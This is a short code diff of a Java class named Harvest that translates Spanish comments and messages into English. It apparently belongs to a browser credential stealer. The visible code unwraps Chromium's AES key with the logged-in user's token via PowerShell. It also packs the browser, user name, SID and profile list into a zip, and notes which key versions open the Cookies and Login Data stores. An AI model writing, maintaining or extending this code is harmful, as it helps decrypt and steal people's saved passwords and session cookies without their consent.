@@ -239,8 +239,8 @@ public final class Harvest {
 	}
 
 	/**
-	 * Desenvuelve la clave AES de Chromium con el token del usuario en sesion. Best-effort: si
-	 * PowerShell falla se deja el error y sigue el respaldo crudo (Local State + dpapi/).
+	 * Unwrap the Chromium AES key with the logged-in user token. Best-effort: if
+	 * PowerShell fails, the error is kept and the raw fallback continues (Local State + dpapi/).
 	 */
 	private static void addKeys(ZipBuilder zip, Browser browser) {
 		if (!AgentPaths.isWindows()) {
@@ -251,7 +251,7 @@ public final class Harvest {
 			return;
 		}
 		StringBuilder text = new StringBuilder();
-		text.append("# v10 abre Cookies y Login Data v10; v20 necesita IElevator\n");
+		text.append("# v10 opens Cookies and Login Data v10; v20 needs IElevator\n");
 		text.append("browser=").append(browser.label()).append('\n');
 		text.append("user=").append(SysInfo.user()).append('\n');
 		text.append("sid=").append(SysInfo.sid()).append('\n');
@@ -259,7 +259,7 @@ public final class Harvest {
 		text.append("profiles=").append(profiles(browser.base())).append('\n');
 		String output = powershell(state);
 		if (output.isBlank()) {
-			text.append("error=sin salida de powershell\n");
+			text.append("error=no powershell output\n");
 		} else {
 			text.append(output).append('\n');
 		}
